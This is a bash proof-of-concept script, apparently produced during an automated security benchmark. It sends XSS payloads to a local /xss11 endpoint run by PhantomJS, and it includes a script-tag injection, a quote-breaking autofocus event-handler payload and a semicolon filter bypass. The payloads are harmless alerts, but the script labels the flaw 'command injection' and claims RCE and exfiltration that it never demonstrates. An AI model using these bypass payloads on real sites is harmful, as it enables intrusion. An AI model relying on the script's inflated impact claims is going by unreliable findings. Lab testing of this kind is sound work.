#!/bin/bash
# POC: Demonstrates command injection vulnerability through PhantomJS subprocess execution with inadequate input sanitization on /xss11 endpoint
# Target: ./repo
# Created: 2025-11-05T17:11:37.965Z
# Session: benchmark-XBEN-012-24-mhm7ivyh

# Command Injection POC - Subprocess/PhantomJS Execution
# This POC demonstrates how inadequate input validation allows injection of
# malicious code that gets executed by PhantomJS through subprocess

TARGET_URL="http://localhost:5000/xss11"

echo "====================================="
echo "Command Injection via Subprocess POC"
echo "====================================="
echo ""

# Test 1: JavaScript injection through HTML file that PhantomJS executes
# PhantomJS will read the file and execute any JavaScript in it
echo "[*] Test 1: JavaScript Code Injection via PhantomJS"
echo "[*] Payload: JavaScript that attempts to read files or execute system commands"
echo ""

# Payload designed to inject JavaScript that could exfiltrate data
PAYLOAD1='"><script>console.log("RCE via PhantomJS JS execution")</script><input type="hidden'

echo "Sending payload: $PAYLOAD1"
RESPONSE1=$(curl -s "${TARGET_URL}?name=${PAYLOAD1}")

echo "Response received:"
echo "$RESPONSE1"
echo ""

# Check if payload appears unescaped in the response
if echo "$RESPONSE1" | grep -q "<script>console.log"; then
    echo "[✓] VULNERABLE: JavaScript code injection detected in response"
    echo "[✓] PhantomJS will execute this JavaScript"
else
    echo "[-] Payload may have been filtered"
fi

echo ""
echo "---"
echo ""

# Test 2: HTML/Event injection through quote breaking
# Since input is written to HTML file without proper escaping
PAYLOAD2='\" onfocus=\"alert(\\\"Code Execution\\\")\" autofocus=\"'

echo "[*] Test 2: Event Handler Injection (Quote Breaking)"
echo "Payload: $PAYLOAD2"
echo ""

RESPONSE2=$(curl -s "${TARGET_URL}?name=${PAYLOAD2}")

echo "Response received:"
echo "$RESPONSE2"
echo ""

# Check if event handlers are present in the response
if echo "$RESPONSE2" | grep -qE "onfocus|autofocus"; then
    echo "[✓] VULNERABLE: Event handler injection detected"
    echo "[✓] PhantomJS will trigger these events"
else
    echo "[-] Event handlers may have been filtered"
fi

echo ""
echo "---"
echo ""

# Test 3: Check if subprocess/PhantomJS execution creates files
# A successful command injection could write files to demonstrate RCE
echo "[*] Test 3: Subprocess/PhantomJS File Creation Detection"
echo "[*] Attempting to identify if PhantomJS processes are running"
echo ""

# Check for PhantomJS processes
if pgrep -f phantomjs > /dev/null 2>&1; then
    echo "[✓] PhantomJS processes detected: subprocess is actively being used"
    echo "$(pgrep -f phantomjs | head -5)"
else
    echo "[-] No active PhantomJS processes detected (may have already completed)"
fi

echo ""
echo "---"
echo ""

# Test 4: Demonstrate that input validation is inadequate
# The existing regex filters don't prevent JavaScript/HTML injection in file context
echo "[*] Test 4: Input Validation Analysis"
echo "[*] The application filters: r'[\"']XSS[\"']' and r'<[a-z/]'"
echo "[*] These filters are insufficient for HTML/JavaScript context"
echo ""

PAYLOAD4='"; alert("Filter bypass with semicolon"); var x = "'

echo "Payload: $PAYLOAD4"
RESPONSE4=$(curl -s "${TARGET_URL}?name=${PAYLOAD4}")

echo "Response:"
echo "$RESPONSE4" | head -20
echo ""

if echo "$RESPONSE4" | grep -q "alert"; then
    echo "[✓] VULNERABLE: Semicolon-based code injection bypasses filter"
else
    echo "[-] Payload may have been filtered"
fi

echo ""
echo "====================================="
echo "POC Summary:"
echo "====================================="
echo "The /xss11 endpoint uses subprocess.Popen() to execute PhantomJS"
echo "with user input embedded in HTML files."
echo ""
echo "Vulnerabilities demonstrated:"
echo "1. JavaScript code injection through file content"
echo "2. HTML event handler injection via quote breaking"
echo "3. Inadequate input validation allowing multiple bypass techniques"
echo "4. PhantomJS executes injected code (potential data exfiltration)"
echo ""
echo "Impact: Code execution in PhantomJS context, data exfiltration,"
echo "and potential RCE if subprocess.Popen() is modified to use shell=True"
echo "====================================="